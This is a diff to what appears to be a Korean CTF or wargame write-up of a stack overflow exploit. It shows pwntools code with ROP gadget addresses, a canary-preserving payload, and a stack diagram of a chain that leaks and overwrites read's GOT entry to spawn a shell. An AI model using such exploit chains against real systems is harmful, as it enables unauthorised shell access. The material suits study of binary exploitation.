@@ -33,7 +33,7 @@ read_plt = e.plt['read']
 read_got = e.got['read']
 puts_plt = e.plt['puts']
 pop_rdi = 0x00000000004007f3        # ROPgadget 라이브러리를 이용해 구함
-pop_rsi_r15 = 0x00000000004007f1    # pop rsi 가젯이 없기에 pop rsi; pop r15 가젯을 이용
+pop_rsi_r15 = 0x00000000004007f1    # pop rdx 가젯이 없기에 pop rsi; pop r15 가젯을 이용
 
 payload = b'A' * (0x40 - 0x08) + p64(canary) + b'B' * 0x08
 
@@ -73,17 +73,17 @@ p.interactive()
 |   canary  |  0x08
 |    SFP    |  0x08
 |    RET    |  0x08     |       pop rdi     |   <- puts(read_got)
-                        |       read_got    |   
+                        |       read_got    |
                         |       puts_plt    |
                         |       pop rdi     |   <- read(0, read_got, 0x10)
                         |          0        |
-                        |     pop rsi_r15   |   
+                        |     pop rsi_r15   |
                         |       read_got    |
                         |          0        |
                         |       read_plt    |
                         |       pop_rdi     |   <- read("/bin/sh") == system("/bin/sh")
                         |   read_got + 0x8  |
-                        |       read_plt    | 
+                        |       read_plt    |
 |-----------|  High Address
 
 
